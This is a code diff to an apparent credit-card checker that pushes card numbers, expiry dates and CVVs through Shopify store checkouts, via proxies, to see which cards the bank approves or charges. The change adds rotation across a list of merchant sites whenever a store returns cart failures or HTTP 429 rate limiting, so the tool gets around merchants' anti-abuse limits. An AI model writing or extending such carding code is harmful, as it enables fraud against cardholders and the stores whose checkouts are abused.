@@ -3200,25 +3200,50 @@ async def check_card_native(cc, mm, yy, cvv, site_url=None, proxy_str=None):
     - Checkout/validation errors (SubmitRejected) → UNTESTED, bank never reached
     - Bank responses (poll FailedReceipt/ProcessedReceipt) → real bank code
     - Approved/charged (ProcessedReceipt) → ORDER_PLACED, Charged=True
+
+    SITE ROTATION:
+    - If the primary site fails with CART_FAILED/429/cooldown, rotate
+      to the next site in DEFAULT_SITE_ROTATION
+    - Tries up to 3 sites before giving up
     """
     import time as _time_mod
     _sh_start = _time_mod.time()
-    try:
-        success, message, gateway, price, currency = await process_card(
-            cc, mm, yy, cvv, site_url or DEFAULT_SITE_ROTATION[0],
-            proxy_str=proxy_str
-        )
-    except Exception as e:
-        return {
-            "Response": "ERROR",
-            "Message": f"Error: {str(e)[:120]}",
-            "Product": "",
-            "Price": "N/A",
-            "Site": site_url or "",
-            "Charged": "False",
-            "Gateway": "Shopify",
-            "Time": "0.0s",
-        }
+
+    # Build site list: user-specified site first, then rotation
+    if site_url:
+        sites_to_try = [site_url] + [s for s in DEFAULT_SITE_ROTATION if s != site_url]
+    else:
+        sites_to_try = list(DEFAULT_SITE_ROTATION)
+
+    success, message, gateway, price, currency = False, "No site available", "Shopify", "N/A", "USD"
+
+    for _site in sites_to_try[:3]:
+        try:
+            success, message, gateway, price, currency = await process_card(
+                cc, mm, yy, cvv, _site,
+                proxy_str=proxy_str
+            )
+        except Exception as e:
+            success, message = False, str(e)[:120]
+            gateway = "Shopify"
+            price = "N/A"
+            currency = "USD"
+
+        # If bank responded (success=True) or we got a non-cart error, stop rotating
+        _clean = extract_clean_response(message) if message else "UNKNOWN"
+        if success:
+            break  # Bank responded — stop rotating
+        # Cart failures / 429 / cooldown → try next site
+        if _clean in ("CART_FAILED", "Cart failed with status 429", "UNKNOWN") and "429" in str(message):
+            print(f"[SH-ROTATE] {_site} failed ({_clean}) — trying next site")
+            await asyncio.sleep(1)  # Brief pause before next site
+            continue
+        # Other errors (no products, site requires login, etc.) → try next site
+        if _clean in ("NO_PRODUCTS", "Not Shopify", "Site requires login!", "SITE_ERROR", "CART_FAILED", "No Products"):
+            print(f"[SH-ROTATE] {_site} failed ({_clean}) — trying next site")
+            continue
+        # Non-cart error that might be a real response → stop rotating
+        break
 
     import time as _time_mod
     _elapsed = _time_mod.time() - _sh_start
